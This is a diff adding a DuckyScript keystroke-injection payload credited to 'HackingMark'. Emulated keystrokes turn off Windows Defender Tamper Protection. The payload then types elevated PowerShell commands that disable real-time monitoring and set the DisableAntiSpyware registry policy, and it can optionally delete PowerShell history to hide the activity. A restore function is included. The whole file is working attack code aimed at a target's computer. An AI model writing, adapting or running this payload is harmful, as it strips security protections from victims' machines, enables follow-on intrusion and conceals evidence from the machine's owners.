@@ -1,0 +1,76 @@
+REM Disable Windows Defender
+REM VERSION 1.0
+REM Author HackingMark
+REM Disables Tampering Protection and Kills Windows Defender on Win 22H2
+REM Tested on German Computers
+REM Uncomment DISABLE_WINDOWS_DEFENDER() or RESTORE() at the end to use it within the Extension or call it later in your Payload.
+          
+          
+REM Attack Commands for disabling RTP and Defender with (T)/without(F) clearing or (R) Restore
+DEFINE ATTACK_F Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; exit;
+DEFINE ATTACK_T Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; Remove-Item (Get-PSReadlineOption).HistorySavePath; exit;
+DEFINE ATTACK_R Set-MpPreference -DisableRealtimeMonitoring $false; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0 -PropertyType DWORD -Force; exit;
+DEFINE ATTACK_RC Set-MpPreference -DisableRealtimeMonitoring $false; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0 -PropertyType DWORD -Force; Remove-Item (Get-PSReadlineOption).HistorySavePath; exit;
+
+REM Change the Term for "Windows-Securitycenter" for your Target Language here:
+DEFINE TERM_WIN_SEC_CENTER Windows-Sicherheit
+REM CLEAN = TRUE deletes PS History, set to FALSE to run Payload without deleting History
+VAR $clean = TRUE
+
+ATTACKMODE HID
+DELAY 2000
+FUNCTION DISABLE_WINDOWS_DEFENDER()
+    GUI s
+    DELAY 500
+    STRINGLN TERM_WIN_SEC_CENTER
+    DELAY 500
+    ENTER
+    TAB
+    TAB
+    TAB
+    TAB
+    ENTER
+    DELAY 500
+    TAB
+    TAB
+    TAB
+    TAB
+    SPACE
+    DELAY 500
+    ALT j
+    DELAY 500
+    ALT F4
+    DELAY 1500
+    GUI x
+    DELAY 100
+    STRING a
+    DELAY 500
+    ALT j
+    DELAY 500
+    IF ($clean == TRUE) THEN
+     STRINGLN ATTACK_T
+    ELSE 
+     STRINGLN ATTACK_F
+    END_IF
+
+END_FUNCTION
+
+FUNCTION RESTORE()
+    GUI x
+    DELAY 100
+    STRING a
+    DELAY 500
+    ALT j
+    DELAY 500
+    IF ($clean == TRUE) THEN
+     STRINGLN ATTACK_RC
+    ELSE 
+     STRINGLN ATTACK_R
+    END_IF
+END_FUNCTION
+
+REM Uncomment the Mode you want to use:
+REM DISABLE_WINDOWS_DEFENDER()
+REM RESTORE()
+
+
